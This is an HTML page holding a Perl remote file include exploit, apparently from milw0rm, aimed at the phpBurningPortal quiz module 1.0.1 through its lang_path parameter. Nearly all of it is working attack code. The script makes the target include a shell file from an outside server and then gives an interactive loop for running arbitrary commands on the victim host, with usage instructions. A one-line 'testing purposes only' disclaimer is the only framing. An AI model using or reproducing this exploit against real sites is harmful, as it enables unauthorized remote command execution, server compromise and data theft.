<html><head><title>phpBurningPortal <= 1.0.1 (lang_path) Remote File Include Exploit</title></head><pre>#!/usr/bin/perl

use LWP::UserAgent;
use LWP::Simple;

$target = @ARGV[0];
$shellsite = @ARGV[1];
$shellcmd = @ARGV[2];
$fileno = @ARGV[3];

if(!$target || !$shellsite)
{
    usage();
}

header();

if ($fileno eq 1)
{
    $file = &quot;quest_delete.php?lang_path=&quot;;
}
elsif ($fileno eq 2)
{
    $file = &quot;quest_edit.php?lang_path=&quot;;
}
elsif ($fileno eq 3)
{
    $file = &quot;quest_news.php?lang_path=&quot;;
}
else
{
    $file = &quot;quest_delete.php?lang_path=&quot;;
}

print &quot;[cmd]\$&quot;;
$cmd = &lt;STDIN&gt;;

while ($cmd !~ &quot;exit&quot;)
{
    $xpl = LWP::UserAgent-&gt;new() or die;
        $req =
HTTP::Request-&gt;new(GET=&gt;$target'/modules/includes/'.$file.$shellsite.'?&amp;'.$shellcmd.'='.$cmd)
or die(&quot;\n\n Failed to connect.&quot;);
        $res = $xpl-&gt;request($req);
        $r = $res-&gt;content;
        $r =~ tr/[\n]/[&amp;#234;]/;

    if (@ARGV[4] eq &quot;-r&quot;)
    {
        print $r;
    }

    print &quot;[cmd]\$&quot;;
    $cmd = &lt;STDIN&gt;;
}

sub header()
{
    print q
    {
########################################################################
    phpBurningPortal quiz-modul-1.0.1 - Remote File Include Exploit
               Vulnerability discovered and exploit by r0ut3r
                       writ3r@gmail.com
            For portal administrator testing purposes only!
########################################################################
    };
}

sub usage()
{
header();
    print q
    {
########################################################################
Usage:
perl q_xpl.pl &lt;Target website&gt; &lt;Shell Location&gt; &lt;CMD Variable&gt; &lt;No&gt; &lt;r&gt;
&lt;Target Website&gt; - Path to target eg: www.qvuln.target.com
&lt;Shell Location&gt; - Path to shell eg: www.badserver.com/s.txt
&lt;CMD Variable&gt; - Shell command variable name eg: cmd
&lt;No&gt; - File number, corresponding to:
1: quest_delete.php
2: quest_edit.php
3: quest_news.php
&lt;r&gt; - Show output from shell
Example:
perl a.pl http://localhost http://localhost/s.txt cmd 1 -r
########################################################################
    };
exit();
}

# milw0rm.com [2006-10-15]</pre></html>